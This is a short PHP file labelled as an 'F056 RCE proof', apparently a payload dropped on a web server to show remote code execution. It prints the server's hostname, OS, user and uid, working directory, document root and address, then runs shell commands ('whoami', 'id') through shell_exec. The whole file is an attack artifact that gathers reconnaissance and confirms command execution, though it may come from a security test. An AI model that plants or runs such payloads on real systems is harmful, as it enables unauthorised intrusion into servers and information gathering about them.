<?php
// F056 RCE verification - reveals server identity + safe whoami/id command execution
header('Content-Type: text/plain; charset=utf-8');
echo "=== F056 RCE PROOF ===\n";
echo "hostname: " . php_uname('n') . "\n";
echo "os: " . php_uname('s') . " " . php_uname('r') . "\n";
echo "user: " . get_current_user() . "\n";
echo "uid: " . (function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'N/A') . "\n";
echo "cwd: " . getcwd() . "\n";
echo "doc_root: " . ($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') . "\n";
echo "server_addr: " . ($_SERVER['SERVER_ADDR'] ?? 'N/A') . "\n";
echo "server_name: " . ($_SERVER['SERVER_NAME'] ?? 'N/A') . "\n";
echo "php_version: " . PHP_VERSION . "\n";
echo "\n=== whoami ===\n";
echo shell_exec('whoami 2>&1') . "\n";
echo "=== id ===\n";
echo shell_exec('id 2>&1') . "\n";
echo "=== END ===\n";
?>
